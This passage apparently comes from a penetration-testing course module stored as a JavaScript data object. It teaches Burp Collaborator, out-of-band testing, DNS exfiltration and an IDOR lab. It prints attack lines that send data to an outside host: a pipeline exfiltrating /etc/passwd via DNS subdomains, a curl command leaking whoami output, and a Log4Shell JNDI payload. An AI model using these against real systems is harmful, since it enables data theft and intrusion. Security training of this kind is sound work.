            "Data Exfiltration via DNS: When target firewalls block outbound HTTP/HTTPS traffic on ports 80 and 443, they almost always allow outbound UDP port 53 (DNS) to resolve hostnames. An attacker can exfiltrate sensitive files (passwords, AWS keys) by prepending data as subdomains (`cat /etc/passwd | xxd -p | ... .collaborator.com`).",
            "Interactsh as an Open-Source Alternative: ProjectDiscovery's Interactsh provides the same OAST capabilities for command-line tools like Nuclei.",
          ],
          callout: "DNS exfiltration is an attacker's ultimate fallback. Even if a target server sits behind three layers of outbound proxy firewalls with zero Internet access, its local DNS server will recursively forward queries to the authoritative nameserver of your Collaborator domain.",
          diagramOrCode: `DNS DATA EXFILTRATION VIA COLLABORATOR:
Command executed on target via Blind RCE:
  curl http://$(whoami).xyz.oastify.com
  
Target DNS server resolves:
  "root.xyz.oastify.com"
  
Collaborator logs incoming query:
  Query: root.xyz.oastify.com | Origin IP: 198.51.100.5
  
Result: The username 'root' is successfully exfiltrated via DNS!`
        }
      ],
      keyTopics: [
        "Out-of-Band Application Security Testing (OAST) Paradigm: Traditional web testing relies on immediate feedback: an attacker injects a payload and inspects the HTTP response for errors or reflected data. However, modern asynchronous architectures process inputs in background worker queues or send requests to internal services that never reflect in the HTTP response. OAST overcomes this limitation by using payloads that coerce the target server to initiate an external network connection back to a controlled listener.",
        "Burp Collaborator Architecture & Listener Daemons: Burp Collaborator is an independent server component running custom DNS, HTTP, HTTPS, and SMTP listener daemons. When Burp Suite tests a target, it generates unique, cryptographically random subdomains (e.g. xyz123.oastify.com) and injects them into application inputs. The target server resolves the domain or initiates an HTTP connection, which the Collaborator server logs with timestamps and originating IP addresses.",
        "Detecting Blind Vulnerabilities (SSRF, XXE, SQLi, Log4j): When testing for Blind Server-Side Request Forgery (SSRF) or Blind XML External Entity (XXE) injection, inserting a Collaborator URL into input fields triggers an immediate out-of-band DNS query from the target's internal network. Similarly, critical vulnerabilities like Log4Shell (CVE-2021-44228) are confirmed by injecting JNDI lookup strings (${jndi:ldap://xyz.oastify.com/a}), which force the vulnerable Java server to query the Collaborator listener.",
        "DNS Exfiltration across Firewalled Egress Networks: In highly hardened enterprise environments, strict egress firewall rules block all outbound HTTP and HTTPS connections (ports 80 and 443) from internal application servers to the public Internet. However, network firewalls almost always permit outbound UDP port 53 (DNS) so internal servers can resolve hostnames. Attackers exfiltrate sensitive data (passwords, AWS keys) by prepending data as DNS subdomains (e.g. $(whoami).xyz.oastify.com).",
        "Deploying Private Collaborator Servers for Enterprise Compliance: In high-security client penetration tests, sending customer data or internal corporate hostnames to public third-party servers like oastify.com violates non-disclosure agreements and data privacy regulations. Organizations deploy their own private Burp Collaborator instances on an AWS EC2 or dedicated server with custom authoritative DNS nameservers. This ensures all out-of-band telemetry remains strictly confidential and compliant.",
      ],
      terminalCommands: [
        "# Test DNS resolution to Collaborator payload:",
        "dig +short xyz123.oastify.com",
      ],
      proTips: [
        "When testing cloud metadata SSRF, inject Collaborator URLs into headers like `X-Forwarded-For`, `Referer`, and `Contact-Us` forms.",
        "If target firewalls block outbound HTTP connections, DNS interactions will still trigger; always monitor DNS logs in the Collaborator tab.",
      ],
    },
  ],
  handsOnLab: {
    title: "Lab 5: Advanced Traffic Interception & Automated IDOR Exploitation",
    target: "Multi-User Web Pentest Environment (BOLA/IDOR Target)",
    goal: "Configure Burp Suite with custom match-and-replace rules, configure Autorize to passively detect unauthorized admin access, and trigger an out-of-band Collaborator interaction.",
    steps: [
      "1. Install and trust PortSwigger CA certificate in Firefox with zero browser security warnings.",
      "2. Set Target Scope to strictly isolate the lab application.",
      "3. Configure Autorize with a regular user session token and browse administrative portals.",
      "4. Analyze Autorize results to locate endpoints returning HTTP 200 with matching byte sizes.",
      "5. Generate a unique Collaborator payload, inject it into an avatar URL input, and capture the incoming DNS interaction.",
    ],
    verification: "Submit the vulnerable endpoint discovered by Autorize, along with the captured DNS query originating from the target server IP in Collaborator.",
  },
  checklist: [
    { id: "ch5-t1", label: "Configured Burp Proxy and trusted PortSwigger CA in browser and mobile trust stores" },
    { id: "ch5-t2", label: "Mastered surgical request tampering and raw CRLF frame inspection in Repeater" },
    { id: "ch5-t3", label: "Understood HTTP/1.1 vs HTTP/2 protocol downgrades and Request Smuggling theory" },
    { id: "ch5-t4", label: "Executed Sniper, Battering Ram, Pitchfork, and Cluster Bomb attacks in Intruder" },
    { id: "ch5-t5", label: "Bypassed application rate limiting using header spoofing and Grep-Extract tokens" },
    { id: "ch5-t6", label: "Created automated Match and Replace rules to strip security headers and swap auth cookies" },
    { id: "ch5-t7", label: "Automated IDOR and BOLA vulnerability detection across all routes with Autorize" },
    { id: "ch5-t8", label: "Confirmed Blind SSRF and command execution using Burp Collaborator OAST listeners" },
  ],
};
